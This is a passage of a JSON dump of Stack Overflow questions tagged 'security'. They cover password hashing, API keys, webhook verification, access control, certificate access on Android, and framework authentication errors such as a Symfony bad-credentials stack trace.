Marco</p>\n"},{"tags":["java","security","jar","bouncycastle"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12190781,"title":"Adding source code to instead of jar giving error JCE can not authenticate provider BC","body":"<p>I am encrypting and decrypting data using Bouncycastle, everything works fine when i use \nbcprov-jdk16-145.jar and  bcmail-jdk16-145.jar  , but requirement is such that i can not put jar instead i have to add this as source code. Problem is when i am  doing this i am getting </p>\n\n<blockquote>\n  <p>java.lang.SecurityException: JCE can not authenticate provider BC</p>\n</blockquote>\n\n<p>so what should i do in order to resolve this issue ? Also i am getting this source code from java2s not from bouncycastle</p>\n\n<blockquote>\n  <p>I have added this two jars in  jre/lib/ext also added\n  security.provider.10=org.bouncycastle.jce.provider.BouncyCastleProvider\n  in jre6\\lib\\security</p>\n</blockquote>\n\n<p><strong>Thanks A lot</strong></p>\n"},{"tags":["security","hash","password-protection"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12172137,"title":"Storing and using piece of a hash","body":"<p>I am building a secure loginmodule and I've been reading all these guides about salting the password before hashing etc.. However I felt that all the passwords are still \"dehashable\" with access to both the hash and the salt.</p>\n\n<p>So I started thinking about what if I just store a piece of the hash in the database instead. In PHP when hashing with SHA-256 I get a 64character string, what if I just save like 50 of these in the database and do the same 50char comparison when logging in.</p>\n\n<p>Bruteforcing would give some extra false-positives. But still they would have to try a lot and a lot of passwords and the real password is certainly not dehashable.</p>\n\n<p>Am I missing something with my idea or could this actually work?</p>\n\n<p>/ Andreas</p>\n"},{"tags":["web-services","security","http","api-key"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12188242,"title":"Is an API key worthless over http since requested parameters can be sniffed?","body":"<p>Is an API key worthless over http since requested parameters can be sniffed?\nAre they only reliable over https?\nEven then, aren't you relying on the client to be careful with their key?</p>\n"},{"tags":["git","security","gpg","git-tag"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12188940,"title":"Why sign Git tags?","body":"<p>Git provides the option to sign annotated tags with your GPG private key, but what is wrong with just accepting a tag's claimed origin? What damage could a spoofed tag do when the tag does not alter the commit?</p>\n"},{"tags":["security","training","access-control","user-management"],"answer_count":16,"favorite_count":17,"up_vote_count":37,"down_vote_count":1,"view_count":3473,"score":36,"question_id":1490940,"title":"What precautions should you take when a senior employee leaves?","body":"<blockquote>\n  <p><strong>EDIT</strong> :  <strong>I agree one should check the\n  reasons, why a senior level employee\n  is leaving. But I am interested in\n  knowing the\n  official/management/technical/legal\n  steps one should take after its\n  decided that he is leaving, so that\n  the life after him is smooth</strong>.</p>\n</blockquote>\n\n<p>What are the steps management should take when a senior programmer/team lead leaves your company.</p>\n\n<p>Some of them which I have thought about are :</p>\n\n<ol>\n<li><p>If He used to manage hosting and domains stuff, change passwords of domain control panels and hosting panels.</p></li>\n<li><p>If your published web sites have maintenance account and he is aware of credentials of that account then change this details also.</p></li>\n<li><p>Suspend mail account for some time and forward all eMails of that account to some ex-employee account. After some time close that account.</p></li>\n</ol>\n\n<p>What are the other things one should check. I am expecting the answer to be a general check list one should follow. It should include both technical scenarios and management scenarios.</p>\n\n<blockquote>\n  <p>Notable Suggestions so far :</p>\n  \n  <ul>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1490956#1490956\">Effectively transfer the responsibilities of that employee to\n  another one without causing any\n  potential delay in your work.</a> </li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1491526#1491526\">Protect your source code. If possible Make them to sign something\n  to say that they don't have copies of\n  source code.</a>. You can also consider <a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493556#1493556\">NDA</a> here.</li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493813#1493813\">Use the Notice Period to train his replacement. Now any new code to the project will be > done by replacement with the help of Guy who is leaving.</a></li>\n  <li><strong><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493813#1493813\">Ask him to create a document of things he thinks you should know.</a></strong></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493813#1493813\">Make sure he checks everything in now and then any checkout will only be done by the replacement.</a> </li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493813#1493813\"><strong>Emails</strong>, copy off his email account to a pst.file (this assumes Outlook), Make this file available to his replacement</a>. the employee should probably be given a chance to scrub the email.</li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1523279#1523279\">if you are going to keep his account open for whatever reason, check that no rules are created that forward incoming emails to an alternate address.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493813#1493813\">Copy the hard drive of his computer to a network location and have someone senior go through and see if there are any files (drafts of performance reviews or other sensitive issues  ) on it that someone else might need.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1493556#1493556\">Clearance from Accounts,Finance,Security,Library etc departments.</a><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1510985#1510985\">Obtain all company property, laptops, keys, etc.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1510985#1510985\">If there is no reason not to, you should reward a departing person for their many years of service. Write them letters of recommendation (even if they already have a new job lined up).Say goodbye, and keep the door open.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1511117#1511117\">Make sure any outside clients know that the departing employee is not their main contact anymore.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1511048#1511048\">Never neglect the exit interview/debriefing.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1511048#1511048\">Confirm the last day of employment so that there is no misunderstanding</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1511048#1511048\">Inform H/R if the employee is on H1B status, there is paperwork required to notify the government when an H1B employee leaves.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1511448#1511448\">Depending on how senior / what position, you might spend some time convincing him not to take the rest of the engineering staff with him.</a></li>\n  <li><a href=\"http://stackoverflow.com/questions/1490940/what-precautions-should-you-take-when-a-senior-employee-leaves/1518694#1518694\">Make sure he spends his last days on a good note, because if he is not leaving on a good note, he can easily pollute the mind of his colleagues.</a></li>\n  </ul>\n</blockquote>\n\n<p>Best Regards,\nMahin Gupta</p>\n\n<p><strong>EDIT :</strong> Now offered a bounty on it to get more detailed responses and practical suggestions.</p>\n"},{"tags":["android","security","licensing","cryptography"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":1,"view_count":2314,"score":5,"question_id":6106681,"title":"Android - How are you dealing with 9774d56d682e549c ? Android ID","body":"<p>So, I thought I was being clever and using various hashes and permutations of Android's secure unique ID to identify my users....</p>\n\n<p>But it turns out that 9774d56d682e549c is a magic ID returned by </p>\n\n<pre><code>Secure.getString(getContentResolver(), Secure.ANDROID_ID);\n</code></pre>\n\n<p>for a good number of devices... It appears every emulator I build has the same ID, and many of other peoples phones (lots of moto droids!) and flashed OS mods tend to return this same repeating value.  Non-MotoDroid / Non-Flashed handsets seem to all give me a unique string back.  But this one is in my DB about 60 times!</p>\n\n<p>I'm going to be optimizing my app to check for that string before registering, but what would be a recommended way of handling it to get another unique value?</p>\n\n<p>My current thought is to check for it, generate an EXTREMELY LARGE random value, hash it, then store than in <code>SharedPreferences</code> and then either use the ANDROID_ID or the one stored in sharedprefs (if the users phone is giving the value).  Anyone have any better ideas, or does this seem solid enough to mitigate this crazy bug?</p>\n"},{"tags":["security","encryption","hash","saltedhash"],"answer_count":9,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1020,"score":2,"question_id":4483160,"title":"hash(hash()) vs salted hash","body":"<p>Since the introduction of <a href=\"http://en.wikipedia.org/wiki/Rainbow_table\" rel=\"nofollow\">Rainbow tables</a>, and using only hashed passwords (e.x: MD5) to stored passwords in database is <a href=\"http://www.codinghorror.com/blog/2007/09/rainbow-hash-cracking.html\" rel=\"nofollow\">not the best secured way</a>.</p>\n\n<p>When people talk about salted hashes, the always use it in this way hash(password . salt) or even hash(hash(password) . salt).</p>\n\n<p>I don't know why to use salt, and add extra entry for each password to store the salt?\nWhy don't we just use hash(hash(password)), or even hash(hash(hash(password)))?</p>\n\n<p>Is it more secure to put salt? or just the sense of being more complex?</p>\n"},{"tags":["web-services","security","rest","authorization"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12183915,"title":"Is providing a cryptographically secure token that only works for one request secure enough for a web service?","body":"<p>I am creating a REST service that is dealing with sensitive data. It will be over SSL, and all request content going both ways will be additionally encrypted.</p>\n\n<p>For authorization, I was planning on making it so a client initially logs in and gets a token, and then they have to provide this token on their next request. Each and every request they do returns a new token. Each token may only be used once.</p>\n\n<p>Is this a secure enough authorization scheme? I've looked at other techniques, such as how Amazon does it for AWS, but it seems like request signing adds a ton of complexity.</p>\n"},{"tags":["security","cryptography","hash","bcrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":30,"score":1,"question_id":12183240,"title":"Store passwords securely in a medium load server","body":"<p>We have a web service written in c/c++\nBefore today user passwords were simply hashed with MD5 and stored in DB\nIt is clear for me that this algorithm is not secure at all</p>\n\n<p>Web service is 1 threaded application. On average it receives ~100 packets a second from users(100p/s). Some of them are authentication packets.</p>\n\n<p>I read about bcrypt and salts, but haven't used this techniques in practice at all.\nThe fact that bcrypt produces hashes slower than MD5 because of security reasons is also clear for me.\nIf we go this way and use bcrypt or scrypt for ciphering passwords and checking auth packets, would it make our service much slower?</p>\n"},{"tags":["security","facebook","ssl","https","picture"],"answer_count":7,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":3403,"score":6,"question_id":5018225,"title":"Loading Facebook profile picture securely","body":"<p>I'm trying to include users profile picture from facebook, which works fine, but the thing is when you want to include it on a SSL-secured page. I can't find a way to get the picture to load from a secure location. Using the following link to the users profile pic:</p>\n\n<pre><code>https://graph.facebook.com/&lt;FB_ID HERE&gt;/picture?type=square\n</code></pre>\n\n<p>Even though I use <strong>https</strong> it doesn't get loaded securely (browser says the page is just partially encrypted). And this isn't strange since the link just redirects to the images, for example for my profile picture:</p>\n\n<pre><code>https://graph.facebook.com/Bazze/picture?type=square\n</code></pre>\n\n<p>This will get the picture from:</p>\n\n<pre><code>http://profile.ak.fbcdn.net/hprofile-ak-snc4/161513_633115680_6792455_q.jpg\n</code></pre>\n\n<p>Note that that is not a secure location.</p>\n\n<p>Anyone know how to load the profile picture securely through the <strong>https</strong> protocol?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","testing"],"answer_count":6,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":505,"score":9,"question_id":452664,"title":"Best Security / Vulnerability Testing Firms?","body":"<p>I'm in charge of a web application that must be extremely secure. Users will be submitting highly sensitive information to each other using the site. Security must be world-class.</p>\n\n<p>We believe we've built site in such a way that minimizes security risks and we've implemented numerous policies and procedures company-wide to increase security.</p>\n\n<p>We'd like a third-party to perform exhaustive and ongoing security tests: automated tests, application testing, and more, to check for things like cross site scripting issues, Server misconfigurations, Form/hidden field manipulation, Command injection, Cookie poisoning, known platform vulnerabilities, etc.</p>\n\n<p>What are the best companies for these types of services?</p>\n"},{"tags":["security"],"answer_count":10,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":471,"score":6,"question_id":441777,"title":"Are there any laws when working with confidential financial data?","body":"<p>I have been asked to build a web application that will be used to store and manipulate sensitive financial data for a private lending firm. Before I bite off more that I can chew, I am trying to figure out if there is anything I should know about legally hosting and securing this kind of information. I have read much about PCI compliance when working with credit card information but this data is a bit different. There will be no financial transactions done online, just viewing balances, rates, loans, etc. by customers and manipulating this data by administrators. I'd equate the sensitivity of this data to that of a bank.</p>\n\n<p>So my ultimate question is whether or not there are any laws regarding storing and transmitting this data. Obviously, an SSL certificate is in order, but what about the hosting. Should I get a dedicated private server or is shared hosting suitable?</p>\n\n<p>Any other input on this situation would be greatly appreciated.\nThanks</p>\n"},{"tags":["mysql","security","filesystems"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12180057,"title":"Storing Sensitive Data","body":"<p>Suppose I want to store terminalCode, merchantCode, pin, user, pass ... for connecting to a web service should i store them in a config file on the system out of web root or store them in a separate database table with special privileges? </p>\n"},{"tags":["asp.net","security"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":154,"score":1,"question_id":11664078,"title":"Permission based access control","body":"<p>I am trying to implement permission based access control in ASP.NET. To implement this I have created some database tables that hold all the information about which roles are assigned what permissions and which roles are assigned to what user.</p>\n\n<p>I am checking the permissions in the business access layer. Right now I have created a method which checks the permissions of the user. If the user has permissions then okay otherwise it redirects to another page.</p>\n\n<p>I want to know if the following things are possible?</p>\n\n<pre><code>class User\n{\n    [PremissionCheck(UserID,ObjectName,OperationName)]\n    public DataTable GetUser()\n    {\n        //coding for user\n    }\n}\n</code></pre>\n\n<p>I have seen it in MVC3. Can I Create it in ASP.NET? If yes then how can I implement it?</p>\n"},{"tags":["java","security","tomcat","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12180916,"title":"Can not send HTTPS request from webapp in Tomcat server but can from normal java program in JVM at same machine","body":"<p>I have a java program which calls an https request and it runs perfectly in JVM.\nBut when I make the project as a java web application and put it in tomcat server and run, it doesn't give the intended response. it gives 403 error.</p>\n\n<p>Do I need to have the permission separately to the tomcat server rather than the machine which installed the tomcat server.</p>\n\n<p>please help me on this.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["web-services","security","authentication","webhooks"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12179155,"title":"Webhook callback security","body":"<p>I provide a web Service to Customers.  I want to provide a feature where upon some event I will notify the Customer by sending a request to a Customer-provided URL.</p>\n\n<p>For example, a notification of order shipment might be sent via a GET request <a href=\"https://customer.example.com/order/12345?status=shipped\" rel=\"nofollow\">https://customer.example.com/order/12345?status=shipped</a></p>\n\n<p>How can the Customer trust this request to be authentic?</p>\n\n<p>When the Customer receives this request they need to verify that the request is really from the Service, it has not been tampered with, and is private.</p>\n\n<p>Sending to the Customer only over SSL comes to mind, but requires the Customer to run an SSL-enabled web server with a signed certificate.  Plus, to authenticate the Service (the client in this request) requires a client-side certificate.   But, SSL should handle encryption, man-in-the-middle, message signing, and replay attacks. </p>\n\n<p>The IP address of the Service can change, so of no use for authentication.</p>\n\n<p>Another approach is used by PayPal's IPN system. PayPal sends a notification to the Customer (merchant in this example) and then the Customer sends the payload back to PayPal over SSL for confirmation.   Essentially asking: \"Hey, PayPal.  Did you send this to me?\"</p>\n\n<p>Can you think of any other approaches?</p>\n"},{"tags":["windows","security","user","scheduling","uac"],"answer_count":3,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":920,"score":5,"question_id":6032557,"title":"Run at logon a desktop application with elevated privileges","body":"<p>The task is widespread, but Im not satisfied with the solutions Ive found so far.</p>\n\n<p>The program must work on the background, regularly scan the system for the state change and, on some conditions, show notifying popup windows to users. The program runs under Windows 7.</p>\n\n<p>There are two nuances. First, it needs elevated privileges (highest level, run as administrator, there is a mess of terminology in Windows) to scan for some protected system information. Second, it must work for all users which have administrative rights.</p>\n\n<p>Heres the list of typical solutions and reasons why they dont suit.</p>\n\n<ol>\n<li>Place the desktop application to the Windows Startup folder. Doesnt work, because doesnt allow to specify elevated privileges. By default, the application wont run. At best, if configure files compatibility, a UAC popup request will appear on the screen each time the program runs.</li>\n<li>Place the file name into registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run. The same problems.</li>\n<li>Add a task to Windows Scheduler and tell to use the highest run level. Works only for a single user, under which the task runs. The others wont see the window.</li>\n<li>Write a windows service. The service can monitor user logons and run desktop applications in their sessions. Havent try this, but read its possible, though tricky. Also, services are harder to debug. Looks like an overkill.</li>\n<li>Write a windows service which receives calls from desktop application, does administrative work and return results to the callers. Desktop application runs without privileges. The solution looks very strange because it means the senseless wrapper services doing nothing but transferring requests and responses should be written for all administrative tasks. Then again, services are harder to debug.</li>\n</ol>\n\n<p>The task looks very common, but the solutions are complicated. Do I misunderstand something? Are there easier ways?</p>\n\n<p>PS: I've seen this topic <a href=\"http://stackoverflow.com/questions/3396134/process-with-administrative-privileges-run-on-user-logon\">Process with administrative privileges run on user logon</a>, but wonder if there are less complicated ways.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I found out that solutions with windows services also don't work for my task. I need to access user's personal certificate store. Service runs under one account and needs to access certificates of another. I haven't found how to do this with .Net cryptography API and guess it's not possible due to security policy.\nI posted the solution I finally came up with as the answer to this question.</p>\n"},{"tags":["security"],"answer_count":6,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2405,"score":3,"question_id":113526,"title":"Potential legal issues with storing Social Security/Insurance Numbers (SSNs/SINs)?","body":"<p>A client using our system has requested that we store the SSNs/SINs of the end users in our database. Currently, we store minimal information about users (name, email address, and optionally, country), so I'm not overly concerned about a security breach - however, I have a suspicion there could be legal issues about storing SSNs and not taking \"appropriate\" measures to secure them (coming from Australia, this is my first encounter with them). Is this a valid concern?</p>\n\n<p>I also read on the Wikipedia page about SINs (Canada's equivalent to SSNs) that it should ONLY be used when absolutely necessary and definitely shouldn't be used as a general identifier, or similar.</p>\n\n<p>So, are there any potential legal issues about this sort of thing? Do you have any recommendations?</p>\n"},{"tags":["security","hacking"],"answer_count":13,"favorite_count":6,"up_vote_count":48,"down_vote_count":2,"view_count":2341,"score":46,"question_id":1705,"title":"Found a critical bug, but the company doesn't care","body":"<p>I know several people who were in a situation like this.</p>\n\n<p>Let's say, you were trying out random sites for basic XSS/SQL Injection vulnerabilities, and you've found one that could be easily compromised. You email the admin/webmaster, but they don't reply. </p>\n\n<p>What would you do?</p>\n"},{"tags":["php","security","https","web-security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12173843,"title":"Constructing not to guess and intercept link and use it to change page","body":"<p>I am developing a site with advertisements, users can place an advertisement for their products. Of course they have to be able to change his advertisement, so  I made a page for changing the advertisement. I want to send a link to the users email address to the change page, I dont want to use a password because there are already so many passwords to remember. Also the user can bookmark the link so he can access the change page quickly. Of course no one other than the user has to be able to access the changepage with the link, also with other computers/tablet so using the IP address is no option.\nHow can I create a unique link witch is no to guess or intercept by hackers? I do have SSL/HTTPS possibilities.</p>\n"},{"tags":["c#",".net","security","url","dns"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":940,"score":1,"question_id":1673153,"title":"How can I check a url is publicly accessible?","body":"<p>I have a web application that you can use to import information from another site by giving it a url. It's been pointed out that you could use this feature to access a private site that is hosted on the same web server.<br>\nSo...<br>\nHow can I check that a given url is publicly accessible (whether on the same web server or somewhere different)?</p>\n\n<p>FIX:\nI ended up doing this:</p>\n\n<pre><code>    protected static bool IsHostWithinSegment(string Host)\n    {\n        Ping pinger = new Ping();\n        string data = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";\n        byte[] buffer = Encoding.ASCII.GetBytes(data);\n        PingOptions options = new PingOptions();\n        options.Ttl = 1;\n\n        PingReply reply = pinger.Send(Host, 1000, buffer, options);\n\n        return reply.Status == IPStatus.Success;\n    }\n\n    private static Uri BindStringToURI(string value)\n    {\n        Uri uri;\n        if (Uri.TryCreate(value, UriKind.Absolute, out uri))\n            return uri;\n\n        // Try prepending default scheme\n        value = string.Format(\"{0}://{1}\", \"http\", value);\n        if (Uri.TryCreate(value, UriKind.Absolute, out uri))\n            return uri;\n\n        return null;\n    }\n</code></pre>\n\n<p>The only requirement of mine that it doesn't fulfil is that some installations of our product will exist alongside each other and you won't be able to import information across them - I suspect this will require using a proxy server to get an extrenal view of things but as it's not a requirement for my project I'll leave it for someone else.</p>\n\n<p>-- I've just realised that this does entirely solve my problem since all the publicly accessible urls resolve to virtual or routable ips meaning they hop.</p>\n"},{"tags":["security","authentication","authorization","tapestry","shiro"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12175775,"title":"URL's security issue in Tapestry-security shiro configuration","body":"<p>I am using tapestry-security with shiro in my application.</p>\n\n<p>My application url looks like <code>localhost:8080//projectname/login</code></p>\n\n<p>I want to give anon access to my login page so that any user can login and after that i will be redirected to <code>localhost:8080//projectname/somepage</code>.</p>\n\n<p>So after login I want to secure all my urls under one role.</p>\n\n<p>Right now in <code>Filterchaindefinition</code> I have done this :</p>\n\n<pre><code>configuration.add(\"login_anon\",new FilterChainDefinition(\"/login**,\"anon\"));\nconfiguration.add(\"all\",new FilterChainDefinition(\"/**,\"authc\"));\n</code></pre>\n\n<p>the second statement is restricting the loading of login page as the url includes /login also.\nAny solution??</p>\n"},{"tags":["security","osgi","bundle","isolation","geronimo"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12175021,"title":"OSGi Bundle Permissions on Geronimo","body":"<p>I am about to make a enterprise cloud OSGi web-service by using Apache Geronimo V3.0.\nThe final goal is to make custom BundleManager(maybe it is a bundle too) that can do simple bundle action like install/uninstall/start/stop the other bundles from any users.\nEach bundle is WAB(web application bundle) and will be added in some Application Bundle.\nBut I encounter some critical problems which can cause security issues.</p>\n\n<ol>\n<li><p>Although only BundleManager I want to make can manage the bundle's lifecycle by using BundleContext , but any bundles made by some users can use BundleContext in Activator or any  servlet in their bundles. So, for example, Bundle A(from user1) can get Bundle B(from user2) from BundleContext and Bundle A can stop or uninstall Bundle B with no permission though Bundle A is not BundleManager..</p></li>\n<li><p>I used to run java security manager and manipulate its(Bundle A) permission. but it didn't properly work. Besides I can access Geronimo Web Admin console with no login process . I think that allpermission in the policy file cause this situation.</p></li>\n</ol>\n\n<p>How can I achieve my goal? I heard that Composite bundle can isolate bundles, but Geronimo didn't support Composite Bundle(CBA). I really wait and appreciate all ideas. Thanks for all your help in advance :)</p>\n"},{"tags":["security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":128,"score":0,"question_id":12165732,"title":"How RSA algorithm encrypt and decrypt string text?","body":"<p>I need the algorithm about encrypt and decrypt using RSA algorithm. Now I have public key, private key, and string text. The questions are</p>\n\n<ol>\n<li>I need to know how to encrypt it. Encrypt each character in text or encrypt whole text.</li>\n<li>How to decrypt it when ciphertext has only number. How to divide number to decrypt.</li>\n</ol>\n\n<p>p.s. Sorry about my bad English. = =\"</p>\n"},{"tags":["android","security","pki","gingerbread","android-keystore"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12169793,"title":"Access certificates installed from SD card of Android devices","body":"<p>I try to access PKI secured services on Android using Java. Certificates were installed on devices through <strong><em>settings->location &amp; security ->Install</em></strong> from SD card.</p>\n\n<p>Seems like on ICS, certificates are shared under <strong><em>/system/etc/security/cacerts</em></strong> while on GingerBread they are in a keystore: <strong><em>/system/etc/security/cacerts.bks</em></strong>.</p>\n\n<p>On ICS I found the <a href=\"http://developer.android.com/reference/android/security/KeyChain.html\" rel=\"nofollow\">KeyChain</a> can read all the installed certificates, so my question is:<p></p>\n\n<p>Is there a way to access certificates installed from SD card on <strong>OS &lt; level 14</strong>?</p>\n\n<p>or </p>\n\n<p>If there is a unified way to access certificates installed from SD card on <strong>OS >= level 8?</strong></p>\n\n<p>Thanks.</p>\n"},{"tags":["security","authentication","token","wcf-rest"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":132,"score":0,"question_id":9922451,"title":"Which is better, Token based authentication or Form based authentication?","body":"<p>I was asked to create a secured WCF Restful Web Service and tried looking at which one was better. Also, does anyone know of any websites implementing token based authentication?</p>\n"},{"tags":["security","authentication","symfony2","credentials"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":189,"score":0,"question_id":12169574,"title":"Symfony2 - authentication - 'Bad credentials' exception","body":"<p>I've done my authentication provider, and everything is good (I can login to secured area), until I type wrong login data. When I type non-existing user, i can see the log below. How can I fix this?</p>\n\n<pre><code>exception 'Symfony\\Component\\Security\\Core\\Exception\\BadCredentialsException' with message 'Bad credentials' in /home/michal/Publiczny/services/vendor/symfony/src/Symfony/Component/Security/Core/Authentication/Provider/UserAuthenticationProvider.php:83\nStack trace:\n#0 /home/michal/Publiczny/services/app/cache/dev/classes.php(406): session_start()\n#1 /home/michal/Publiczny/services/app/cache/dev/classes.php(119): Symfony\\Component\\HttpFoundation\\SessionStorage\\NativeSessionStorage-&gt;start()\n#2 /home/michal/Publiczny/services/app/cache/dev/classes.php(43): Symfony\\Component\\HttpFoundation\\Session-&gt;start()\n#3 [internal function]: Symfony\\Bundle\\FrameworkBundle\\EventListener\\SessionListener-&gt;onKernelRequest(Object(Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent))\n#4 /home/michal/Publiczny/services/vendor/symfony/src/Symfony/Bundle/FrameworkBundle/Debug/TraceableEventDispatcher.php(82): call_user_func(Array, Object(Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent))\n#5 /home/michal/Publiczny/services/app/cache/dev/classes.php(3727): Symfony\\Bundle\\FrameworkBundle\\Debug\\TraceableEventDispatcher-&gt;doDispatch(Array, 'kernel.request', Object(Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent))\n#6 /home/michal/Publiczny/services/app/cache/dev/classes.php(4838): Symfony\\Component\\EventDispatcher\\EventDispatcher-&gt;dispatch('kernel.request', Object(Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent))\n#7 /home/michal/Publiczny/services/app/cache/dev/classes.php(3909): Symfony\\Bundle\\FrameworkBundle\\ContainerAwareEventDispatcher-&gt;dispatch('kernel.request', Object(Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent))\n#8 /home/michal/Publiczny/services/app/cache/dev/classes.php(3895): Symfony\\Component\\HttpKernel\\HttpKernel-&gt;handleRaw(Object(Symfony\\Component\\HttpFoundation\\Request), 1)\n#9 /home/michal/Publiczny/services/app/cache/dev/classes.php(4899): Symfony\\Component\\HttpKernel\\HttpKernel-&gt;handle(Object(Symfony\\Component\\HttpFoundation\\Request), 1, true)\n#10 /home/michal/Publiczny/services/app/bootstrap.php.cache(551): Symfony\\Bundle\\FrameworkBundle\\HttpKernel-&gt;handle(Object(Symfony\\Component\\HttpFoundation\\Request), 1, true)\n#11 /home/michal/Publiczny/services/web/app_dev.php(27): Symfony\\Component\\HttpKernel\\Kernel-&gt;handle(Object(Symfony\\Component\\HttpFoundation\\Request))\n#12 {main}\n</code></pre>\n\n<p>My security.yml:</p>\n\n<pre><code>security:\nencoders:\n    Puzzle\\AdministrationBundle\\Entity\\Admin: sha512\n    Symfony\\Component\\Security\\Core\\User\\User: plaintext\n\nrole_hierarchy:\n    ROLE_ADMIN:       ROLE_USER\n    ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\nproviders:\n    admins:\n        entity: { class: PuzzleAdministrationBundle:Admin }\n\nfirewalls:\n    dev:\n        pattern:  ^/(_(profiler|wdt)|css|images|js)/\n        security: false\n\n    login:\n        pattern:  ^/administration/login$\n        security: false\n\n    secured_area:\n        pattern:    ^/administration\n        form_login:\n            check_path: /administration/login_check\n            login_path: /administration/login\n        logout:\n            path:   /administration/logout\n            target: /administration\n\naccess_control:\n    - { path: ^/administration/login, roles: IS_AUTHENTICATED_ANONYMOUSLY}\n    - { path: ^/administration/admin, roles: ROLE_ADMIN}\n</code></pre>\n"},{"tags":["php","security","codeigniter","encryption","passwords"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":321,"score":1,"question_id":12157970,"title":"Codeigniter: How can i encrypt password before submitting the form to the controller?","body":"<p>hi i have a simple <code>html</code> login form</p>\n\n<pre><code>&lt;form method=\"post\" action=\"http://www.mysite.com/login\"&gt;\n\n&lt;input type=\"text\" name=\"text_box\" /&gt;\n&lt;input type=\"password\" name=\"pass_word\" /&gt;\n&lt;input type=\"submit\" name=\"submit\"&gt;\n\n&lt;/form&gt;\n</code></pre>\n\n<p>when i submit the form </p>\n\n<p>and in the controller </p>\n\n<pre><code>public function login(){\n\n$pass_word = $this-&gt;input-&gt;post('pass_word');\ndie($pass_word);\n\n}\n</code></pre>\n\n<p>the problem here , it shows the plain password . if i type <code>123456</code> in controller , i get <code>123456</code>.</p>\n\n<ol>\n<li>is this a security issue </li>\n<li>can any one get my password through a network monitoring tool like wireshark .</li>\n</ol>\n\n<p>how to avoid this . can i encrypt the password in view , before send to the controller , please help , thanks in advance 